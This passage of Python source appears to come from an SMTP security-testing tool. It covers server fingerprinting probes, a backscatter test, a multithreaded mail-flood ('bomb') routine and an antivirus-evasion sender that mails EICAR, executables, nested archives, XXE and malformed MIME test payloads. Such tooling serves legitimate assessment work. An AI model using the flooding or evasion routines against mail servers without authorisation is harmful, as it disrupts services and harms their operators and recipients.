                tls_downgrade_findings = self._probe_tls_downgrade(host, port, use_implicit, sni_host)

            # Latency measurement (RSET): 1x for -id, 3x for --id-aggressive (jitter) - Phase 3
            latency_avg_ms = None
            latency_jitter_ms = None
            try:
                rtt_count = 3 if id_aggressive else 1
                rtts: list[float] = []
                for _ in range(rtt_count):
                    t0 = time.perf_counter()
                    smtp.docmd("RSET")
                    rtts.append((time.perf_counter() - t0) * 1000)
                if len(rtts) >= 2:
                    latency_avg_ms = sum(rtts) / len(rtts)
                    variance = sum((x - latency_avg_ms) ** 2 for x in rtts) / len(rtts)
                    latency_jitter_ms = (variance**0.5) if variance >= 0 else 0.0
                elif rtts:
                    latency_avg_ms = rtts[0]
            except Exception:
                pass

            # Target host for cert_domain_match (hostname or PTR)
            target_host = host
            try:
                ipaddress.ip_address(host)
                try:
                    ptr_host, _, _ = socket.gethostbyaddr(host)
                    if ptr_host and "." in ptr_host:
                        target_host = ptr_host
                except (socket.herror, socket.gaierror, OSError):
                    pass
            except ValueError:
                pass  # host is hostname

            # Aggressive: VRFY (collect error), unknown cmd (X-PENTEST/SQUASH/X-NON-EXISTENT), line length probe
            if id_aggressive:
                status_vrfy, vrfy_bytes = smtp.docmd("VRFY", "root")
                if vrfy_bytes and status_vrfy not in (250, 251):
                    error_samples.append(vrfy_bytes.decode(errors="replace"))
                # Unknown command: X-PENTEST, fallback SQUASH, fallback X-NON-EXISTENT
                status_unk, unk_bytes = smtp.docmd("X-PENTEST")
                if unk_bytes:
                    unknown_cmd_response = unk_bytes.decode(errors="replace")
                else:
                    status_sq, sq_bytes = smtp.docmd("SQUASH")
                    if sq_bytes:
                        unknown_cmd_response = sq_bytes.decode(errors="replace")
                    else:
                        status_xn, xn_bytes = smtp.docmd("X-NON-EXISTENT")
                        if xn_bytes:
                            unknown_cmd_response = xn_bytes.decode(errors="replace")
                # Line length probe: EHLO with 1000+ char param (RFC 5321 max 1000) - Postfix: "500 5.5.2 Error: line too long"
                try:
                    status_ll, ll_bytes = smtp.docmd("EHLO", "a" * 1000)
                    if ll_bytes and status_ll not in (250, 251):
                        error_samples.append(ll_bytes.decode(errors="replace"))
                except Exception:
                    pass  # Server may disconnect on long line; continue to quit

            transport_tls = isinstance(getattr(smtp, "sock", None), ssl.SSLSocket)
            starttls_advertised = bool(ehlo_raw and re.search(r"starttls", ehlo_raw, re.I))

            try:
                smtp.quit()
            except Exception:
                pass
        except Exception as e:
            raise

        return identify_smtp_server(
            banner=banner,
            ehlo_raw=ehlo_raw,
            help_response=help_response,
            error_samples=error_samples,
            unknown_cmd_response=unknown_cmd_response,
            id_aggressive=id_aggressive,
            tls_cert_subject=tls_cert_subject,
            tls_cert_issuer=tls_cert_issuer,
            tls_cert_san=tls_cert_san,
            tls_cert_self_signed=tls_cert_self_signed,
            tls_upgrade_failed=tls_upgrade_attempted and cert_info is None,
            tls_upgrade_error=tls_upgrade_error,
            transport_tls=transport_tls,
            starttls_advertised=starttls_advertised,
            tls_policy=tls_policy,
            tls_cert_warnings=tls_cert_warnings,
            tls_cipher_warnings=tls_cipher_warnings,
            tls_downgrade_findings=tls_downgrade_findings,
            tls_downgrade_probed=tls_downgrade_probed,
            os_hint=os_hint,
            target_host=target_host,
            latency_avg_ms=latency_avg_ms,
            latency_jitter_ms=latency_jitter_ms,
        )

    def test_bounce_replay(self) -> BounceReplayResult:
        """
        Bounce / backscatter test (PTL-SVC-SMTP-REPLAY).
        Two probes on one connection: (1) MAIL FROM + DATA with From header only;
        (2) MAIL FROM + DATA including Return-Path header — to observe whether the MTA
        mishandles envelope vs header paths for NDRs. Uses 30s timeout per command.
        """
        host = self.args.target.ip
        port = self.args.target.port
        timeout = 30.0
        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls

        bounce_addr = _bounce_replay_from_addr(self.args)
        if not bounce_addr:
            return BounceReplayResult(
                vulnerable=False,
                indeterminate=True,
                message_accepted=False,
                rcpt_rejected_in_session=False,
                bounce_addr="",
                recipient_used="",
                test_id="",
                smtp_trace=(),
                tarpitting_or_timeout=False,
                detail="-br requires -m/--mail-from (controlled address for MAIL FROM / bounce checks)",
                message_accepted_return_path=False,
                test_id_return_path="",
            )

        bounce_addr = str(bounce_addr).strip()
        test_id = f"{random.getrandbits(32):08x}"
        test_id_rp = f"{random.getrandbits(32):08x}"
        rcpt_raw = getattr(self.args, "rcpt_to", None) or ""
        recipient = str(rcpt_raw).strip()
        if not recipient:
            return BounceReplayResult(
                vulnerable=False,
                indeterminate=True,
                message_accepted=False,
                rcpt_rejected_in_session=False,
                bounce_addr=bounce_addr,
                recipient_used="",
                test_id=test_id,
                smtp_trace=(),
                tarpitting_or_timeout=False,
                detail="-br requires -r/--rcpt-to (recipient)",
                message_accepted_return_path=False,
                test_id_return_path="",
            )

        msg_id_domain = "example.com"
        if "@" in bounce_addr:
            msg_id_domain = bounce_addr.split("@", 1)[1].strip()
        if not msg_id_domain or "." not in msg_id_domain:
            msg_id_domain = "example.com"

        def _build_body(include_return_path: bool, tid: str) -> str:
            rp = f"Return-Path: <{bounce_addr}>\r\n" if include_return_path else ""
            return (
                f"{rp}"
                f"From: <{bounce_addr}>\r\n"
                f"To: <{recipient}>\r\n"
                f"Subject: Bounce-replay test ID: {tid}\r\n"
                f"X-PT-Test-ID: {tid}\r\n"
                f"Date: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\n"
                f"Message-ID: <{tid}.{int(time.time())}@{msg_id_domain}>\r\n"
                f"\r\n"
                f"Bounce replay probe (PTL-SVC-SMTP-REPLAY). "
                f"{'Return-Path header present. ' if include_return_path else 'MAIL FROM envelope + From only. '}\r\n"
            )

        def _connect_br() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL, int]:
            if use_tls:
                try:
                    ipaddress.ip_address(host)
                    _sni = None
                except ValueError:
                    _sni = host
                sock = socket.create_connection((host, port), timeout=timeout)
                sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                smtp = smtplib.SMTP(timeout=timeout)
                smtp.sock = sock_ssl
                smtp.file = None
                status, _ = smtp.getreply()
                return smtp, status
            smtp = smtplib.SMTP(timeout=timeout)
            status, _ = smtp.connect(host, port)
            if status != 220:
                return smtp, status
            if use_starttls:
                stls_status, _ = smtp.docmd("STARTTLS")
                if stls_status != 220:
                    return smtp, stls_status
                try:
                    ipaddress.ip_address(host)
                    _sni = None
                except ValueError:
                    _sni = host
                sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                smtp.sock = sock_ssl
                smtp.file = None
                smtp.helo_resp = None
                smtp.ehlo_resp = None
                smtp.esmtp_features = {}
                smtp.does_esmtp = False
            return smtp, 220

        smtp_trace: list[str] = []

        def _phase(
            smtp: smtplib.SMTP | smtplib.SMTP_SSL,
            label: str,
            body: str,
        ) -> tuple[bool, bool, bool, bool, str | None]:
            """Returns (data_accepted_250, rcpt_rejected_5xx, mail_rejected, indeterminate, detail)."""
            smtp_trace.append(f"--- {label} ---")
            try:
                mail_status, _ = smtp.docmd("MAIL", f"FROM:<{bounce_addr}>")
                smtp_trace.append(f"MAIL FROM: {mail_status}")
            except socket.timeout:
                smtp_trace.append("MAIL FROM: timeout")
                return False, False, True, True, "Timeout (30s) on MAIL FROM"
            if mail_status not in (250, 251):
                if mail_status == 530:
                    d = "NOT VULNERABLE: Authentication required"
                elif mail_status in (551, 553, 554):
                    d = "NOT VULNERABLE: Sender rejected by policy"
                else:
                    d = f"NOT VULNERABLE: MAIL FROM rejected ({mail_status})"
                return False, False, True, False, d
            try:
                rcpt_status, _ = smtp.docmd("RCPT", f"TO:<{recipient}>")
                smtp_trace.append(f"RCPT TO: {rcpt_status}")
            except socket.timeout:
                smtp_trace.append("RCPT TO: timeout")
                return False, False, False, True, "Timeout (30s) on RCPT TO"
            if rcpt_status in (550, 551, 552, 553, 554):
                return False, True, False, False, "NOT VULNERABLE: RCPT rejected in session – no bounce expected for this probe"
            if rcpt_status not in (250, 251):
                return False, False, True, False, f"NOT VULNERABLE: RCPT unexpected ({rcpt_status})"
            try:
                data_status, _ = smtp.data(body)
                smtp_trace.append(f"DATA: {data_status}")
            except socket.timeout:
                smtp_trace.append("DATA: timeout")
                return False, False, False, True, "Timeout (30s) on DATA"
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, OSError) as e:
                smtp_trace.append(f"DATA: {e}")
                return False, False, False, True, f"Connection closed during DATA: {e}"
            if data_status == 250:
                return True, False, False, False, None
            return False, False, True, False, f"NOT VULNERABLE: DATA rejected ({data_status})"

        try:
            smtp, conn_status = _connect_br()
            if conn_status != 220:
                smtp_trace.append(f"Connect: {conn_status}")
                try:
                    smtp.quit()
                except Exception:
                    pass
                return BounceReplayResult(
                    vulnerable=False,
                    indeterminate=True,
                    message_accepted=False,
                    rcpt_rejected_in_session=False,
                    bounce_addr=bounce_addr,
                    recipient_used=recipient,
                    test_id=test_id,
                    smtp_trace=tuple(smtp_trace),
                    tarpitting_or_timeout=False,
                    detail=f"Connection failed: {conn_status}",
                    message_accepted_return_path=False,
                    test_id_return_path="",
                )

            try:
                ehlo_status, _ = smtp.docmd("EHLO", self.fqdn or "bounce-test.local")
                smtp_trace.append(f"EHLO: {ehlo_status}")
            except socket.timeout:
                smtp_trace.append("EHLO: timeout")
                try:
                    smtp.quit()
                except Exception:
                    pass
                return BounceReplayResult(
                    vulnerable=False,
                    indeterminate=True,
                    message_accepted=False,
                    rcpt_rejected_in_session=False,
                    bounce_addr=bounce_addr,
                    recipient_used=recipient,
                    test_id=test_id,
                    smtp_trace=tuple(smtp_trace),
                    tarpitting_or_timeout=True,
                    detail="Timeout (30s) on EHLO - possible greylisting or tarpitting (WARNING)",
                    message_accepted_return_path=False,
                    test_id_return_path="",
                )

            body1 = _build_body(include_return_path=False, tid=test_id)
            acc1, rcpt_rej1, mail_rej1, indet1, det1 = _phase(
                smtp, "Probe 1: MAIL FROM + DATA (From header; no Return-Path in body)", body1
            )
            if indet1:
                try:
                    smtp.quit()
                except Exception:
                    pass
                return BounceReplayResult(
                    vulnerable=False,
                    indeterminate=True,
                    message_accepted=False,
                    rcpt_rejected_in_session=rcpt_rej1,
                    bounce_addr=bounce_addr,
                    recipient_used=recipient,
                    test_id=test_id,
                    smtp_trace=tuple(smtp_trace),
                    tarpitting_or_timeout=True,
                    detail=det1 or "Probe 1 incomplete",
                    message_accepted_return_path=False,
                    test_id_return_path="",
                )

            try:
                smtp.docmd("RSET")
                smtp_trace.append("RSET")
            except Exception:
                pass

            body2 = _build_body(include_return_path=True, tid=test_id_rp)
            acc2, rcpt_rej2, mail_rej2, indet2, det2 = _phase(
                smtp, "Probe 2: MAIL FROM + DATA (Return-Path + From headers)", body2
            )

            try:
                smtp.quit()
            except Exception:
                pass

            rcpt_rejected_both = (rcpt_rej1 or rcpt_rej2) and not (acc1 or acc2)
            parts: list[str] = []
            if acc1:
                parts.append(
                    f"Probe 1: server accepted DATA (250) — possible backscatter. "
                    f"Check {bounce_addr} for NDR within 2–5 min. Test ID: {test_id}"
                )
            elif det1 and not acc1 and not indet1:
                parts.append(f"Probe 1: {det1}")
            if indet2:
                parts.append(f"Probe 2: {det2 or 'timeout or connection lost'}")
            elif acc2:
                parts.append(
                    f"Probe 2 (Return-Path in DATA): server accepted DATA (250). "
                    f"Check {bounce_addr} for NDR. Test ID: {test_id_rp}"
                )
            elif det2:
                parts.append(f"Probe 2: {det2}")

            if not parts:
                detail = "NOT VULNERABLE: No successful DATA acceptance in either probe"
            else:
                detail = " ".join(parts)

            return BounceReplayResult(
                vulnerable=False,
                indeterminate=bool(indet2 and not (acc1 or acc2)),
                message_accepted=acc1,
                rcpt_rejected_in_session=rcpt_rejected_both,
                bounce_addr=bounce_addr,
                recipient_used=recipient,
                test_id=test_id,
                smtp_trace=tuple(smtp_trace),
                tarpitting_or_timeout=bool(indet2 and not (acc1 or acc2)),
                detail=detail,
                message_accepted_return_path=acc2,
                test_id_return_path=test_id_rp if acc2 else "",
            )

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            return BounceReplayResult(
                vulnerable=False,
                indeterminate=True,
                message_accepted=False,
                rcpt_rejected_in_session="timeout" in str(e).lower(),
                bounce_addr=bounce_addr,
                recipient_used=recipient,
                test_id=test_id,
                smtp_trace=tuple(smtp_trace),
                tarpitting_or_timeout="timeout" in str(e).lower(),
                detail=f"Connection error: {e}",
                message_accepted_return_path=False,
                test_id_return_path="",
            )

    def _bomb_progress_line_rt(self) -> None:
        """Redraw one terminal line: -bomb progress (non-JSON). Caller should hold bomb lock when updating outcomes.

        Long bars must stay on one physical line: wrapping breaks \\r clears and spams the screen.
        If bomb_count exceeds the terminal width budget, a compact bar (bucketed) + \"k/n\" suffix is used.
        """
        if self.use_json:
            return
        outcomes = getattr(self, "_bomb_rt_outcomes", None)
        n = int(getattr(self, "_bomb_rt_count", 0) or 0)
        if outcomes is None or n <= 0:
            return
        try:
            term_w = max(40, shutil.get_terminal_size(fallback=(100, 24)).columns)
        except (OSError, AttributeError, ValueError):
            term_w = 100

        prefix = f"    {get_colored_text('[*]', 'INFO')} Progress: "
        completed = sum(1 for o in outcomes if o is not None)
        # Budget for glyph columns: leave margin for ANSI + prefix; avoid wrap at ~term_w-1
        budget_1to1 = max(8, term_w - 34)

        if n <= budget_1to1:
            parts: list[str] = []
            for i in range(n):
                o = outcomes[i]
                if o is None:
                    parts.append("░")
                elif o:
                    parts.append(get_colored_text("█", "NOTVULN"))
                else:
                    parts.append(get_colored_text("█", "VULN"))
            bar = "".join(parts)
            line = prefix + bar
        else:
            # Compact: W buckets, each covers a slice of message indices; + numeric suffix
            suffix = f" {completed}/{n}"
            w = max(8, term_w - 34 - len(suffix))
            parts = []
            for j in range(w):
                i0 = (j * n) // w
                i1 = ((j + 1) * n) // w
                if i1 <= i0:
                    i1 = i0 + 1
                seg = outcomes[i0:i1]
                if any(x is None for x in seg):
                    parts.append("░")
                elif all(x is True for x in seg):
                    parts.append(get_colored_text("█", "NOTVULN"))
                elif all(x is False for x in seg):
                    parts.append(get_colored_text("█", "VULN"))
                else:
                    parts.append(get_colored_text("▓", "WARNING"))
            bar = "".join(parts)
            line = prefix + bar + suffix

        sys.stdout.write("\033[2K\r" + line)
        sys.stdout.flush()

    def test_bomb(self) -> BombResult:
        """
        Test mail flooding / rate limiting (PTL-SVC-SMTP-BOMB).
        Sends multiple messages and records delivered vs rate-limited vs blocked.
        Never raises – all errors are caught and recorded.
        """
        host = self.args.target.ip
        port = self.args.target.port
        rcpt = str(self.args.rcpt_to).strip()
        mail_from = self.args.mail_from or f"bombtest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        from_name = getattr(self.args, "from_name", None) or ""
        cc_raw = getattr(self.args, "cc", None) or ""
        cc_list = [a.strip() for a in cc_raw.split(",") if a.strip()] if cc_raw else []
        requested_count = getattr(self.args, "bomb_count", 100)
        bomb_count = max(1, int(requested_count))
        bomb_timeout = max(5.0, getattr(self.args, "bomb_timeout", 60.0))
        bomb_delay = max(0.0, getattr(self.args, "bomb_delay", 0.0))
        bomb_threads = max(1, min(getattr(self.args, "bomb_threads", 1), 50))
        bomb_randomize = getattr(self.args, "bomb_randomize", False)
        socket_timeout = 10.0
        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls
        if bomb_threads > 10 and (use_tls or use_starttls) and not self.use_json:
            self.ptprint(
                "[!] Warning: High thread count with TLS may cause client-side CPU bottlenecking. Results might be skewed.",
                Out.TEXT,
            )

        counters = {"delivered": 0, "rate_limited": 0, "blocked": 0, "connection_lost": 0}
        first_rejection_at: list[int | None] = [None]
        last_error_ref: list[str] = [""]
        last_error_type_ref: list[str] = [""]
        smtp_trace: list[str] = []
        response_times: list[float] = []  # Elapsed sec per message (for RTT / tarpitting)
        tarpitting_detected = False
        lock = threading.Lock()
        start_time = time.perf_counter()
        outcomes: list[bool | None] = [None] * bomb_count
        abort_500 = threading.Event()
        abort_at_ref: list[int | None] = [None]
        self._bomb_rt_outcomes = outcomes
        self._bomb_rt_count = bomb_count
        self._mail_bomb_live_progress_completed = False
        if not self.use_json:
            self._bomb_progress_line_rt()

        def _connect_bomb() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            """Returns (smtp, error). On success: (smtp, ""). On failure: (None, str(e))."""
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=socket_timeout)
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=socket_timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    status, _ = smtp.getreply()
                    if status != 220:
                        return None, f"Connect: {status}"
                    return smtp, ""
                smtp = smtplib.SMTP(timeout=socket_timeout)
                status, _ = smtp.connect(host, port)
                if status != 220:
                    return None, f"Connect: {status}"
                if use_starttls:
                    st_status, _ = smtp.docmd("STARTTLS")
                    if st_status != 220:
                        return None, f"STARTTLS: {st_status}"
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    smtp.helo_resp = None
                    smtp.ehlo_resp = None
                    smtp.esmtp_features = {}
                    smtp.does_esmtp = False
                return smtp, ""
            except Exception as e:
                return None, str(e)

        def _send_one(idx: int) -> tuple[str, int | str | None, str]:
            """Returns (reason, status_or_error, error_type). For connection_lost, error_type is classification."""
            rid = f"{random.getrandbits(16):04x}" if bomb_randomize else ""
            subject = f"BOMB Test Message {idx}" + (f" [id:{rid}]" if rid else "")
            body = f"Tested message content – PTL-SVC-SMTP-BOMB flood test message no {idx}." + (f" Id:{rid}" if rid else "")
            from_hdr = f'"{from_name}" <{mail_from}>' if from_name else f"<{mail_from}>"
            to_hdr = f"<{rcpt}>"
            cc_hdr = ", ".join(f"<{c}>" for c in cc_list) if cc_list else ""
            headers = [f"From: {from_hdr}", f"To: {to_hdr}"]
            if cc_hdr:
                headers.append(f"Cc: {cc_hdr}")
            headers.extend([f"Subject: {subject}", f"X-PT-Test-ID: {rid or str(idx)}", "Date: " + time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())])
            msg = "\r\n".join(headers) + "\r\n\r\n" + body + "\r\n"
            recipients = [rcpt] + cc_list

            smtp, conn_err = _connect_bomb()
            if smtp is None:
                err_type, err_msg = _classify_connection_error(Exception(conn_err or "Connection failed"))
                return ("connection_lost", err_msg, err_type)

            try:
                ehlo_s, _ = smtp.docmd("EHLO", self.fqdn or "bomb-test.local")
                if ehlo_s == 500:
                    return ("fatal_500", 500, "")
                mail_s, _ = smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                if mail_s == 500:
                    return ("fatal_500", 500, "")
                status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                if status == 500:
                    return ("fatal_500", 500, "")
                if status in (250, 251):
                    for c in cc_list:
                        s, _ = smtp.docmd("RCPT", f"TO:<{c}>")
                        if s == 500:
                            return ("fatal_500", 500, "")
                        if s not in (250, 251):
                            break
                    data_status, _ = smtp.data(msg)
                    if data_status == 500:
                        return ("fatal_500", 500, "")
                    if data_status == 250:
                        return ("delivered", 250, "")
                if 400 <= status < 500:
                    return ("rate_limited", status, "")
                if status >= 500:
                    return ("blocked", status, "")
                return ("blocked", status, "")
            except smtplib.SMTPResponseException as e:
                if e.smtp_code == 500:
                    return ("fatal_500", 500, "")
                if 400 <= e.smtp_code < 500:
                    return ("rate_limited", e.smtp_code, "")
                return ("blocked", e.smtp_code, "")
            except (smtplib.SMTPServerDisconnected, ConnectionResetError, BrokenPipeError, OSError, socket.timeout) as e:
                err_type, err_msg = _classify_connection_error(e)
                return ("connection_lost", err_msg, err_type)
            except Exception as e:
                err_type, err_msg = _classify_connection_error(e)
                return ("connection_lost", err_msg, err_type)
            finally:
                try:
                    smtp.quit()
                except Exception:
                    pass

        def _bomb_drain_queue(queue_in: queue.Queue) -> None:
            while True:
                try:
                    queue_in.get_nowait()
                except queue.Empty:
                    return
                queue_in.task_done()

        def _worker(queue_in: queue.Queue) -> None:
            while True:
                if abort_500.is_set():
                    _bomb_drain_queue(queue_in)
                    return
                try:
                    idx = queue_in.get_nowait()
                except queue.Empty:
                    return
                if time.perf_counter() - start_time > bomb_timeout:
                    queue_in.task_done()
                    return
                if abort_500.is_set():
                    queue_in.task_done()
                    return
                if bomb_delay > 0:
                    time.sleep(bomb_delay)
                if abort_500.is_set():
                    queue_in.task_done()
                    return
                t0 = time.perf_counter()
                reason, status_or_err, err_type = _send_one(idx)
                elapsed_msg = time.perf_counter() - t0
                with lock:
                    response_times.append(elapsed_msg)
                    ok = reason == "delivered"
                    outcomes[idx - 1] = ok
                    if reason == "delivered":
                        counters["delivered"] += 1
                    elif reason == "rate_limited":
                        counters["rate_limited"] += 1
                        if first_rejection_at[0] is None:
                            first_rejection_at[0] = idx
                    elif reason == "blocked":
                        counters["blocked"] += 1
                        if first_rejection_at[0] is None:
                            first_rejection_at[0] = idx
                    elif reason == "fatal_500":
                        counters["blocked"] += 1
                        if first_rejection_at[0] is None:
                            first_rejection_at[0] = idx
                        abort_at_ref[0] = idx
                        smtp_trace.append(f"SMTP 500 at msg {idx} — test stopped (no further messages)")
                        abort_500.set()
                    else:
                        counters["connection_lost"] += 1
                        if first_rejection_at[0] is None:
                            first_rejection_at[0] = idx
                        err_str = str(status_or_err) if status_or_err else "connection lost"
                        last_error_ref[0] = err_str
                        last_error_type_ref[0] = err_type or "other"
                    if not self.use_json:
                        self._bomb_progress_line_rt()
                queue_in.task_done()
                if reason == "fatal_500":
                    return

        msg_queue: queue.Queue = queue.Queue()
        for i in range(1, bomb_count + 1):
            msg_queue.put(i)
        workers: list[threading.Thread] = []
        for _ in range(bomb_threads):
            t = threading.Thread(target=_worker, args=(msg_queue,))
            t.daemon = True
            t.start()
            workers.append(t)
        try:
            for t in workers:
                t.join(timeout=bomb_timeout + 5)
        finally:
            if not self.use_json:
                try:
                    self._bomb_progress_line_rt()
                except Exception:
                    pass
                sys.stdout.write("\n")
                sys.stdout.flush()
                self._mail_bomb_live_progress_completed = True
        elapsed = time.perf_counter() - start_time

        delivered = counters["delivered"]
        rate_limited = counters["rate_limited"]
        blocked = counters["blocked"]
        connection_lost = counters["connection_lost"]
        sent = sum(1 for o in outcomes if o is not None)
        first_rej = first_rejection_at[0]
        per_message_delivered = tuple(o for o in outcomes if o is not None)
        aborted_500 = abort_at_ref[0] is not None

        # RTT and tarpitting: compare first vs last quartile of response times
        avg_rtt_ms: float | None = None
        if len(response_times) >= 8:
            n = len(response_times)
            quarter = max(1, n // 4)
            first_avg = statistics.mean(response_times[:quarter])
            last_avg = statistics.mean(response_times[-quarter:])
            avg_rtt_ms = statistics.mean(response_times) * 1000.0
            # If last-quartile avg >> first-quartile (e.g. 5x) and > 1s -> tarpitting
            if last_avg > 5.0 * first_avg and last_avg > 1.0 and first_avg > 0.001:
                tarpitting_detected = True

        # Verdict hierarchy: VULNERABLE > PARTIAL > SECURE > INDETERMINATE
        ratio = delivered / sent if sent > 0 else 0.0
        rate_or_blocked = rate_limited > 0 or blocked > 0

        indeterminate = (
            delivered == 0 and rate_limited == 0 and blocked == 0 and connection_lost == sent
        )
        vulnerable = ratio > 0.95 and sent >= 100
        partial_protection = (
            not vulnerable
            and (
                (0.1 < ratio <= 0.95 and sent >= 50)
                or (rate_or_blocked and first_rej is not None and first_rej > 50)
            )
        )

        detail_parts = [f"{delivered}/{sent} delivered"]
        if rate_limited:
            detail_parts.append(f"{rate_limited} rate-limited (4xx)")
        if blocked:
            detail_parts.append(f"{blocked} blocked (5xx)")
        if connection_lost:
            detail_parts.append(f"{connection_lost} connection_lost")
        if partial_protection:
            detail_parts.append(f"partial protection (first rejection at msg {first_rej})")
        if aborted_500 and abort_at_ref[0] is not None:
            detail_parts.append(f"stopped early (SMTP 500 at msg {abort_at_ref[0]})")

        return BombResult(
            vulnerable=vulnerable,
            indeterminate=indeterminate,
            partial_protection=partial_protection,
            sent=sent,
            delivered=delivered,
            rate_limited=rate_limited,
            blocked=blocked,
            connection_lost=connection_lost,
            first_rejection_at=first_rej,
            elapsed_sec=elapsed,
            tarpitting_detected=tarpitting_detected,
            last_error=last_error_ref[0] or "",
            last_error_type=last_error_type_ref[0] or "",
            avg_rtt_ms=avg_rtt_ms,
            smtp_trace=tuple(smtp_trace[-50:]),
            per_message_delivered=per_message_delivered,
            aborted_on_smtp_500=aborted_500,
            abort_at_message=abort_at_ref[0],
            detail="; ".join(detail_parts),
        )

    def _get_antivirus_definitions_path(self) -> Path:
        """Return base path for antivirus test definitions (ptsrvtester/tests/smtp/antivirus)."""
        return Path(__file__).resolve().parent.parent / "tests" / "smtp" / "antivirus"

    def test_antivirus(self) -> AntivirusResult:
        """
        Test antivirus/antispam protection (PTL-SVC-SMTP-ANTIVIRUS).
        Sends prepared test messages and records accepted vs rejected vs error per category.
        """
        host = self.args.target.ip
        port = self.args.target.port
        rcpt = str(self.args.rcpt_to).strip()
        mail_from = self.args.mail_from or f"avtest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        from_name = getattr(self.args, "from_name", None) or ""
        cc_raw = getattr(self.args, "cc", None) or ""
        cc_list = [a.strip() for a in cc_raw.split(",") if a.strip()] if cc_raw else []
        timeout = max(5.0, getattr(self.args, "antivirus_timeout", 30.0))
        skip_absent = getattr(self.args, "antivirus_skip_absent", False)
        incl_zip_bomb = getattr(self.args, "antivirus_zip_bomb", False)
        cats_arg = getattr(self.args, "antivirus_categories", None)
        default_cats = [
            "eicar", "double_ext", "executable", "nested_archive",
            "encoded_content", "html_sanitization", "xxe", "mime_malformed",
        ]
        if cats_arg:
            categories = [c.strip().lower() for c in cats_arg.split(",") if c.strip()]
        else:
            categories = list(default_cats)
        if incl_zip_bomb and "zip_bomb" not in categories:
            categories.append("zip_bomb")

        base_path = self._get_antivirus_definitions_path()
        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls
        cc_hdr = ", ".join(f"<{c}>" for c in cc_list) if cc_list else ""
        from_hdr = f'"{from_name}" <{mail_from}>' if from_name else f"<{mail_from}>"
        recipients = [rcpt] + cc_list
        start_time = time.perf_counter()
        cat_results: list[AntivirusCategoryResult] = []
        # Categories where accepted > 0 yields VULNERABLE: evasion, recursive decompression,
        # encoded content (AV must decode before scan), HTML/XSS, XXE, malformed MIME
        RISKY_CATEGORIES = frozenset({
            "eicar", "double_ext", "executable", "nested_archive",
            "encoded_content", "html_sanitization", "xxe", "mime_malformed",
        })

        def _connect_av() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            """Connect to SMTP. No AUTH – suitable for port 25 (MTA). For port 587 (Submission),
            AUTH is typically required; future enhancement could add -u/-p support."""
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                    return smtp, ""
                smtp = smtplib.SMTP(timeout=timeout)
                st, _ = smtp.connect(host, port)
                if st != 220:
                    return None, f"Connect: {st}"
                if use_starttls:
                    st2, _ = smtp.docmd("STARTTLS")
                    if st2 != 220:
                        return None, f"STARTTLS: {st2}"
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    smtp.helo_resp = None
                    smtp.ehlo_resp = None
                    smtp.esmtp_features = {}
                    smtp.does_esmtp = False
                return smtp, ""
            except Exception as e:
                return None, str(e)

        def _build_mime(msg_def: dict, att_dir: Path, msg_dir: Path) -> tuple[str, list[str]]:
            """
            Build MIME message. Returns (msg_str, missing_attachments).
            If any requested attachment is missing, list is non-empty – caller should not send
            (avoids false SECURE when message has no payload).
            Supports: bodyBase64, bodyQuotedPrintable (encoded_content), rawEml (mime_malformed).
            """
            subject = msg_def.get("subject", "Antivirus test")
            body = msg_def.get("body", "Antivirus test message.")
            body_html = msg_def.get("bodyHtml")
            body_base64 = msg_def.get("bodyBase64")
            body_qp = msg_def.get("bodyQuotedPrintable")
            raw_eml = msg_def.get("rawEml")
            attachments = msg_def.get("attachments") or []
            custom_headers = msg_def.get("headers") or {}
            missing: list[str] = []

            if raw_eml:
                eml_path = msg_dir / raw_eml
                if not eml_path.is_file():
                    missing.append(raw_eml)
                    return "", missing
                with open(eml_path, "rb") as f:
                    raw = f.read().decode("utf-8", errors="replace")
                raw = raw.replace("{FROM}", from_hdr).replace("{TO}", f"<{rcpt}>").replace("{SUBJECT}", subject)
                if cc_hdr:
                    raw = raw.replace("{CC}", cc_hdr)
                else:
                    raw = raw.replace("Cc: {CC}\r\n", "")
                return raw, missing

            msg = MIMEMultipart("mixed")
            msg["Subject"] = subject
            msg["From"] = from_hdr
            msg["To"] = f"<{rcpt}>"
            if cc_hdr:
                msg["Cc"] = cc_hdr
            msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
            msg["X-PT-Test"] = "PTL-SVC-SMTP-ANTIVIRUS"
            for k, v in custom_headers.items():
